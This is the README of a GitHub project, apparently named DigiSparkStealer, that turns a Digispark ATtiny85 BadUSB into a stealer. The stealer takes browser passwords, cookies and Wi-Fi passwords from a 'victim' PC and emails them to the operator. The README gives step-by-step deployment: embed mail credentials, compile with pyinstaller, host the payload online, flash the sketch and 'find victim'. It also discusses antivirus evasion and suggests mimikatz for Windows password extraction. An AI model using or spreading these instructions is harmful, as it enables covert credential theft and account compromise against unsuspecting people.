# DigiSparkStealer 🚀

This project allows you to steal passwords and cookies of the victim by inserting a Digispark Attiny85, 
ATMEGA32U4 or another programming controller with this software and after few seconds you have all the data by mail

**Just plug BadUSB and get all data**

# Warning

**Everything in this repository is strictly for educational purposes. Notice I am not responsible
 for stolen data. You are responsible for your actions using developed script for BadUSB**

# About 

All your data when working with a browser is cached. Since popular browsers like **Chrome, Opera or Yandex Browser** 
are [chromium based browsers](https://en.wikipedia.org/wiki/Chromium_%28web_browser%29#Other_browsers_based_on_Chromium),
 all stored data on a computer has a similar structure.

The interesting for us data collected in database SQLite. The url, login fields are stored explicitly,
but password must be decrypted by [win32crypt](https://sourceforge.net/projects/pywin32/files/).
This type of encryption means that passwords can be extended only on the client’s computer and nowhere else.
We run our program on the client, it uses the client's keys to decrypt passwords and send the decrypted data to
our email. Moreover, we can also send cookies and another useful information.

For example, to get all the saved passwords from earlier connected Wi-Fi networks, you just need to type the command:
```bash
netsh wlan show profiles
```
It displays a list of all saved networks. For each network, you must write a command with 
name (ESSID) of the network. You can read more [here](https://superuser.com/a/709541) 

This way we get more victims information. MAC-addresses also can be extracted, using ```ipconig /all```

## Alpha version NTLM

Try to extract Windows user password using 
[mimikatz](https://github.com/gentilkiwi/mimikatz), 
[pypykatz](https://github.com/skelsec/pypykatz) and 
[pypykatz + procdump](https://www.stevencampbell.info/Parsing-Creds-From-Lsass.exe-Dumps-Using-Pypykatz/)

## Run

Based on the fact that antivirus programs define chrompass as malicious
and do not allow it to be run, I had to write a program myself that receives all the data. 
My modified code sends data to the mail, while in the previous version of the program 
a powershell was involved in SMTP server creation.

Advantages:
* Not blocked by firewall
* Steals WI-FI passwords
* Works not only with Chrome, but also with Opera and Yandex
* Simple w3-style css report. 

![Output example](https://github.com/kovinevmv/DigiSparkStealer/raw/master/docs/example.png)

Disadvantages:
* Big executable file (5Mb) 

# Getting Started

### Requirements

1. Buy [Digispark ATtiny85](https://www.ebay.com/sch/i.html?_from=R40&_trksid=p2047675.m570.l1311.R1.TR3.TRC1.A0.H0.Xdigispark+atti.TRS0&_nkw=digispark+attiny85&_sacat=0)
2. Install Arduino IDE for [Digispark](https://digistump.com/wiki/digispark/tutorials/connecting)

### Install 
 1.  Download this repo 

**Linux:**
 
    $ git clone https://github.com/kovinevmv/DigiSparkStealer
    $ cd DigiSparkStealer
    
 **Windows:** Click on green button on right top of main page. Then - "Download Zip"

2. Replace your mail, password from the mail and the recipient with your data [here](https://github.com/kovinevmv/DigiSparkStealer/blob/master/python_source/main.py)
3. Compile your code by [pyinstaller](http://www.pyinstaller.org/) to create executable file
```
pyinstaller --onefile main.py
```
4. Upload executable file from *dist* to Internet (like git or DropBox)
5. Replace LINK_HERE with your url [here](https://github.com/kovinevmv/DigiSparkStealer/blob/master/arduino_source/sketch/sketch.ino)
6. Run sketch in Arduino IDE, plug Digispark Attiny85
7. Find victim)



### Requirements for victim's PC

* Switch the keyboard layout to English.
* Internet is required on the victim's computer


 
# TODO

* Integrate mimikatz to extract passwords from windows.
* Rewrite WI-FI password grabber to powershell script, to get all the passwords including those requiring administrator rights.
* Fix Yandex Browser

 
 
# Old versions

## Based on Nirsoft program

[Nirsoft sources](https://github.com/kovinevmv/DigiSparkStealer/blob/master/_nirsoft)

First version is based on [Nirsoft program](https://www.nirsoft.net/utils/chromepass.html) - **ChromePass**

This software is very convenient and has own advantages. The company has developed software for recovering forgotten passwords. To see your passwords, you just need to run the program and get all your passwords saved on the PC in the "Login Data" file. Most antivirus programs, including Windows Defender, block this file, so most likely the result of this script is poor. Here is [report](https://www.virustotal.com/#/file/0c32986c997f194a82610110f5eb3abe552ce63540cfb8bae2048a3df5d3cb10/detection). A PC with a disabled protector and no antivirus is required.

**Remember that it only steals Chrome passwords. No more!!!**

Advantages:
* Fast download. Executable file is \<1Mb. Can be used in case of bad internet at the victim.
* Simple presentation of the report in csv, html text forms.

Disadvantages:
* High probability of launch blocking


### Donate for coffee

| Boosty |
| ------------- |
| <a href="https://boosty.to/kovinevmv/donate"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/92/Boosty_logo.svg/2560px-Boosty_logo.svg.png" width="200" /></a> | 
